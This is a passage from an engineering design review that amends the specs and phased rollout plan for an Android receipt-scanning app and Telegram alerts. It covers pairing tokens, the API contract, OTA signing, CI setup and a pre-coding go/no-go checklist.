- Template ops (staff, outlet, payment, purpose, customer) appear on the card
  according to `template_id`. The app does not show a field the template does
  not have.
- There is no `service_charge` field in `Receipt`. Do not display it unless the
  extractor and type are extended. Map a printed service charge to tax only if
  the template says so, and document it.
- If the receipt date is null, the app fills the capture date and marks it
  "tanggal diasumsikan". The server uses it for the month tab but never presents
  it as grounded OCR.
- The `scanId` is issued by `POST /api/extract`, not generated on the client.
  The append call uses it. A retry uses the same id and must be idempotent.
- On a lost append response, the app queries the scan result before retrying.
  A 409 with a stored result is success, not an error.
- Photo proof: when `workspace.photo_proof` is true, the append request includes
  the image (multipart) or a `photo_upload_id`. The server uploads to the user's
  Drive with the user's id, returns `photo`, and trashes the file on append
  failure. The app strips EXIF before upload.
- If there is no offline queue in v1, state it and show a retry state. If there
  is one, encrypt it, cap it, and define retention.
```

Add the FSM states from §3.2 of this review.

#### Amend §7 (Telegram)

Replace §7.3 with the token design, private-chat rule, one-to-one mapping, `update_id` dedupe, HTML escaping, and alert placement from H8. Add:

```markdown
- Telegram linking is opt-in. The web privacy policy and the link screen
  disclose that email, balance, and sheet title are sent to Telegram.
- The bot rejects receipt images in v1. If receipt images are added later, they
  are a new third-party processing path and need their own disclosure.
- Admin alerts use `TELEGRAM_CHAT_ID` or `TELEGRAM_ADMIN_CHAT_ID`. User alerts
  use the linked chat id. Never send admin details to a user chat.
- Low-credit alerts are sent after a successful spend, at most once per low
  period, and contain no purchase link or "isi ulang" instruction.
- Top-up confirmations are sent after `grant()` and `onTopupApproved()` succeed,
  idempotent on the order id.
- A Telegram failure never blocks billing, append, or pairing.
```

Replace the low-credit copy:

```text
Sisa {n} scan. Buka zippp di web untuk melihat detail akun.
```

#### Amend §8 (Layout)

Replace the Telegram path with:

```text
src/lib/telegram/
  admin.ts       <-- move the existing src/lib/telegram.ts here
  index.ts       <-- re-export sendTelegram for existing call sites
  bot.ts         <-- Bot API client
  store.ts       <-- link tokens, mappings, update dedupe
  alerts.ts      <-- low-credit, top-up, pairing
src/lib/auth/
  request-user.ts
  mobile-token.ts
  pairing-store.ts
  device-store.ts
src/app/api/auth/
  pair/generate/route.ts
  pair/claim/route.ts
  pair/status/route.ts
  devices/route.ts
  device/revoke/route.ts
  logout/route.ts       <-- bearer logout
src/app/api/mobile/
  me/route.ts
  scans/[id]/route.ts
```

Add Android directories for `data/security/`, `data/ota/`, `ui/pairing/`, `ui/review/`, `ui/settings/`.

### 5.2 Amendments to `spec/themes/02-android-telegram-pivot/android-rollout-plan.md`

#### Add Phase 0 before Phase 1

| Phase | Focus | Deliverables | Exit gate |
|---|---|---|---|
| **Phase 0** | Contract and security freeze | Distribution decision, API schema, error codes, threat model, wording keys, boundary tests, CI skeleton, signing plan | No P0 risk remains open; specs amended; tests written but not necessarily green |

Phase 0 tasks:

- **0.1 Distribution decision.** Sideload-only or Play. If Play, targetSdk 35+, Play build flavor, no GitHub OTA, Play In-App Updates.
- **0.2 Contract freeze.** Write `spec/contracts/mobile-v1.md` (or OpenAPI) with:
  - token claims and device lifecycle
  - pairing endpoints and exact code format
  - workspace DTO
  - extract request/response and server-issued scanId
  - append request/response and error codes
  - app-version manifest and signature
  - Telegram link token and webhook shape
  - Generate Kotlin serialization models from the contract or keep them in sync with a test.
- **0.3 Threat model.** Pairing brute force, token theft, lost phone, group chat leak, formula injection, AI cost abuse, OTA supply chain, Telegram webhook replay.
- **0.4 Wording.** Add `android.*`, `telegram.*`, and error-code keys to `spec/wording.txt`. Add a generator for `android/app/src/main/res/values/strings.xml` and a CI diff check.
- **0.5 Boundary tests.** Extend `data-boundary.test.ts` as described in §3.5.
- **0.6 CI skeleton.** Web job (`npm ci`, `npm test`, `tsc --noEmit`, `next build`) and Android job (`setup-java 21`, Gradle cache, `./gradlew lint test assembleDebug`).
- **0.7 Signing and secrets.** Decide Play App Signing vs sideload key. Document CI secrets. Add Android outputs and keystores to `.gitignore`.

#### Amend Phase 1 tasks

Replace Task 1.1 with:

- **1.1 Mobile token and device store** (`src/lib/auth/mobile-token.ts`, `device-store.ts`)
  - Opaque token or JWT with `jti`, `device_id`, `aud`, `iss`, `scope`, `ver`, `iat`, `exp`.
  - Redis records for device and revocation.
  - `requestUser(req)` resolver.
  - Tests: valid, expired, revoked, wrong scope, wrong device, missing cookie, bearer-only.

Replace Task 1.2 with:

- **1.2 Pairing store and rate limiter**
  - 8-character Crockford Base32, `SET NX`, SHA-256 at rest, 10-minute TTL, `GETDEL`, attempt counters, per-IP/per-user limits.
  - Tests: collision, race, expiry, lockout, generic errors.

Replace Task 1.3 with:

- **1.3 Pairing endpoints**
  - `POST /api/auth/pair/generate` (web session, no-store, invalidates prior codes).
  - `POST /api/auth/pair/claim` (public, rate-limited, device metadata).
  - `POST /api/auth/pair/status` (optional device approval).
  - Do not touch `src/app/api/auth/login/route.ts`.

Replace Task 1.5 with:

- **1.5 Auth propagation through the data layer**
  - Add `requestUser(req)` to `append`, `corrections`, `balance`, and `mobile/me`.
  - Pass `userId` to `loadTokensForUser`, `loadWorkspaceForUser`, `appendRows`, and every Google helper.
  - Verify no helper falls back to `sessionUserId()` on the mobile path.
  - Test bearer-only append and cross-user rejection.

Add Task 1.7:

- **1.7 Contract and boundary tests**
  - Extend `data-boundary.test.ts`.
  - Add formula-escaping tests.
  - Add 402/409/401 error-envelope tests.
  - Add a static test that Android resources contain no purchase copy.

Add Task 1.8:

- **1.8 Workspace DTO and ops**
  - `GET /api/mobile/workspace` or include the safe workspace in the login response.
  - Add `ops` parsing and validation to append.
  - Add photo proof request handling (multipart or upload token).

#### Amend Phase 2 tasks

- **2.1** `compileSdk = 35`, `targetSdk = 35`, `minSdk = 26`, `buildConfig = true`, `versionCode`/`versionName` from CI.
- **2.2** Use a version catalog. Replace "Encrypted DataStore" with a concrete Keystore/DataStore design or EncryptedSharedPreferences. Add CameraX 1.4.x, Compose BOM, Navigation, DataStore, OkHttp, Retrofit + Kotlinx Serialization, Coil, ML Kit (choose bundled vs unbundled), lifecycle, core-ktx, activity-compose.
- **2.3** Manifest: `CAMERA`, `INTERNET`, `ACCESS_NETWORK_STATE`; `POST_NOTIFICATIONS` only if local notifications; `REQUEST_INSTALL_PACKAGES` only in the `sideload` flavor. Add `allowBackup=false`, `dataExtractionRules`, `fullBackupContent`, `usesCleartextTraffic=false`, `networkSecurityConfig`, `exported=false` for non-launcher components.
- **2.4** Add `android/local.properties` to `.gitignore`, document `JAVA_HOME`, commit the Gradle wrapper, and add `android/.gradle/`, `android/**/build/`, `*.jks`, `*.keystore`, `keystore.properties` to `.gitignore`.
- **2.5** Add build flavors `sideload` and `play`; the Play flavor has no OTA installer and no `REQUEST_INSTALL_PACKAGES`.
- **2.6** Add the Android CI job.

#### Amend Phase 3 tasks

- **3.1** Store the token with Keystore AES-GCM + DataStore or EncryptedSharedPreferences. Add backup exclusion. Do not log tokens.
- **3.2** Pairing UI: exact 8-character format, `Kode berlaku 10 menit`, generic errors, no "dashboard web" copy, no purchase copy.
- **3.3** OTA: signed manifest, SHA-256, size, APK signer verification, in-app download, `PackageInstaller`, mandatory logic, throttle, offline behavior, Play flavor bypass.
- **3.4** Device info, last seen, unpair, server-side logout, revoked-device handling.

#### Amend Phase 4 tasks

- **4.1** CameraX + EXIF stripping + max dimensions + upload size/timeout.
- **4.2** Extract client with bearer, no extra form fields, server-issued `scanId`, timeout/retry.
- **4.3** Review flags, hard/soft semantics, edits, template ops, assumed date, no `service_charge` unless modeled.
- **4.4** Append with `ops`, `photo_upload_id`, stable `scanId`, 402/409/401 mapping, corrections telemetry, retry/reconcile.
- **4.5** Offline queue decision. If yes, encrypted and bounded. If no, explicit retry state.
- **4.6** Photo proof for reimbursement; Drive upload with `userId`; trash on failure.
- **4.7** Month tab/daily block dependency, or move the month-tab gate to a separate phase.

#### Amend Phase 5 tasks

- Add wording keys and the generated `strings.xml`.
- Add device approval UI if implemented.
- Add "hide code" and countdown.
- Add an anti-steering resource grep.

#### Amend Phase 6 tasks

- **6.1** Telegram store: link tokens, private-chat rule, one-to-one mapping, `update_id` dedupe, `/unlink`.
- **6.2** Alerts: low-credit after spend, top-up after grant, pairing after device. Dedupe. No `ledger.ts` import. No purchase CTA.
- **6.3** Privacy disclosure and opt-in. No receipt images in v1.
- **6.4** Resolve the `src/lib/telegram.ts` file/directory conflict.

#### Amend Phase 7 tasks

- Keep `CONTACT_WA`, `whatsappLink`, and the legal/footer business contact. Remove only `src/lib/wa/*`, `/api/wa/*`, `app.wa.*` copy, and the Settings WA panel, after a feature-flag-off and migration window.
- Do not delete `sendTelegram` admin alerts.
- Update `SPEC.md`, `ARCHITECTURE.md`, `USER-FLOW.md`, `wording.txt`, `README.md`, and `AGENTS.md` in the same change. The new pivot docs do not replace the owning specs.

#### Amend Phase 8 tasks

- **8.1** Signing: Play App Signing decision, upload key, CI secrets, no keystore in the repo.
- **8.2** Build an AAB for Play and an APK for sideload. Measure size; do not hard-code a 15 MB gate without a measurement.
- **8.3** Release script: version code/name from the same source, SHA-256, signed manifest, update `/api/app-version`, verify the download.
- **8.4** Play Console: Data Safety, privacy policy URL, target audience, content rating, permission declarations, account deletion path, internal testing, staged rollout.
- **8.5** E2E matrix:
  - pair, append, credit decreases
  - zero credits: no purchase copy
  - append failure: refund and retry
  - lost response: no duplicate row
  - lost phone: revoke from web, mobile gets 401
  - mandatory OTA: download, checksum, install; offline retry
  - Telegram link/unlink/group rejection
  - formula payload does not execute
  - data-boundary test passes with mobile imports

---

## 6. Pre-coding gate

Do not start Phase 1 until all of these are true:

- [ ] Distribution channel is decided: sideload-only or Play.
- [ ] If Play: `targetSdk` is 35+ and the Play build has no GitHub OTA and no `REQUEST_INSTALL_PACKAGES`.
- [ ] Pairing format is 8 Crockford characters, hashed, `SET NX`, `GETDEL`, rate-limited, and the exchange route is renamed.
- [ ] `requestUser(req)` exists and bearer-only append is proven by a test.
- [ ] Every Google helper used by mobile accepts an explicit `userId`.
- [ ] Device records, `jti`/`device_id`, revocation, web device list, and mobile logout are in the contract.
- [ ] Mobile append contract includes `ops`, `scanId`, photo proof, and result replay.
- [ ] Sheet formula escaping is implemented and tested.
- [ ] 402/409/401 responses use stable codes and the Android app has no purchase copy.
- [ ] Telegram link token, private-chat rule, one-to-one mapping, webhook secret, and `update_id` dedupe are specified.
- [ ] Android token storage is a real Keystore/DataStore design, with backups excluded.
- [ ] `spec/wording.txt` has the new keys and the Android strings are generated, not hardcoded.
- [ ] `data-boundary.test.ts` covers the mobile/auth imports.
- [ ] CI runs the web and Android gates.

If any of the first six is unresolved, the correct verdict for Phase 1 is **NO-GO**, even though the overall architecture is **GO WITH AMENDMENTS**.
